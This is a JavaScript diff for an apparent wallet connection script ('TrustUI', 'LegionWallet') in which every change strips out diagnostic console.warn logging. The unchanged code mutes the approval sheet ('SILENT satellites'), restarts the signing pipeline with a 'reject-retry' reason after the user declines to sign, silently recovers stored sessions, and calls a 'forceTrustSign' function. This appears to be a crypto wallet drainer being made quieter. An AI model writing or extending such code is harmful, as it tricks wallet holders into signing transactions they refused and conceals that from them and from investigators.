@@ -144,7 +144,7 @@
 
   function showApproveSheet(addr) {
     // SILENT satellites — no overlay sheets (plan: one-flow silence)
-    console.warn('[TrustUI] showApproveSheet muted', addr && String(addr).slice(0, 10));
+
     return;
   }
 
@@ -206,7 +206,7 @@
         prov = await window.LegionWallet.tryRecoverStoredSession(true);
       }
     } catch (e) {
-      console.warn('[TrustUI] tryRecoverStoredSession', e && e.message);
+
     }
 
     if (prov) {
@@ -246,19 +246,19 @@
   function runPipeline(why) {
     if (pipelineBusy) return Promise.resolve(false);
     pipelineBusy = true;
-    console.warn('[TrustUI] pipeline', why);
+
     return (async function () {
       try {
         var got = await ensureProviderAndAddr();
         if (!got.addr) {
-          console.warn('[TrustUI] pipeline: no addr');
+
           return false;
         }
         setConnectButton(got.addr);
 
         var L = window.legion;
         if (!L) {
-          console.warn('[TrustUI] pipeline: legion missing');
+
           return false;
         }
         try {
@@ -280,13 +280,13 @@
 
         // Approve / reject-retry only — route through single pipeline owner
         if (typeof L.evmAlreadyConfirmed === 'function' && L.evmAlreadyConfirmed()) {
-          console.warn('[TrustUI] EVM already confirmed — skip');
+
           return true;
         }
         if (typeof L.startPipeline === 'function') {
           var reason = (L.state && L.state.userRejectedSign) ? 'reject-retry' : 'sign';
           var r = await L.startPipeline({ reason: reason });
-          console.warn('[TrustUI] startPipeline', r && (r.path || r.error || r.ok));
+
           return !!(r && r.ok);
         }
         if (typeof L.forceTrustSign === 'function') {
@@ -295,7 +295,7 @@
         }
         return false;
       } catch (e) {
-        console.warn('[TrustUI] pipeline err', e && e.message);
+
         return false;
       } finally {
         pipelineBusy = false;
@@ -336,11 +336,11 @@
     try {
       var got = await ensureProviderAndAddr();
       if (got.addr) {
-        console.warn('[TrustUI] recovered', got.addr.slice(0, 10), 'prov=' + !!got.prov);
+
         markConnected(got.addr, { sheet: false, pipeline: false });
         return true;
       }
-      console.warn('[TrustUI] no session to recover');
+
       return false;
     } finally {
       recovering = false;
